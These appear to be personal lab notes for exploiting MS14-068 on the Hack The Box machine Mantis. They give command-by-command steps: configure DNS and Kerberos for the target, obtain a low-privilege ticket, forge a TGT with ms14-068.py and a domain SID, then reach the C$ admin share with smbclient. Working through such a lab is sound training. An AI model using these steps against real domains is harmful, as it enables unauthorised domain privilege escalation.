MS14-068

https://zachgrace.com/posts/exploiting-ms14-068/
https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
https://0xdf.gitlab.io/2020/09/03/htb-mantis.html

**Ippsec video -> Mantis**

* * *

## **STEPS**

**Add target DNS server to resolv.conf**

# Generated by NetworkManager

search localdomain
nameserver 10.10.10.52
nameserver 192.168.18.2

**Modify /etc/krb5.conf to match the target server**

[libdefaults]
default_realm = HTB.LOCAL

[realms]
htb.local = {
kdc = mantis.htb.local:88
admin_server = mantis.htb.local
default_domain = HTB.LOCAL
}

[domain_realm]
.domain.internal = HTB.LOCAL
domain.internal = HTB.LOCAL

**Synchronise time to the target server **
**
**
sudo rdate -n mantis.htb.local

**Try to generate a kerberos ticket with the target user's name**
**
**
kinit james
klist

**Try to connect to the admin share on the target server (it should not work because we are still connecting as the low privilege user)**

**
**
smbclient -W HTB.LOCAL  //mantis/c$ -k

**Run MS14-068 script (check the toolbox folder)**

Before running the command, be sure to get the correct SID from rpcclient.

python2.7 ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis

**Move the forged ticket to the /tmp folder with correct UID at the end**

cp TGT_james@HTB.LOCAL.ccache /tmp/krb5cc_1001

**Try to connect the admin share again**
**
**
smbclient -W HTB.LOCAL  //mantis/c$ -k

**If it doesn't work, be sure to double check the resolv.conf file**
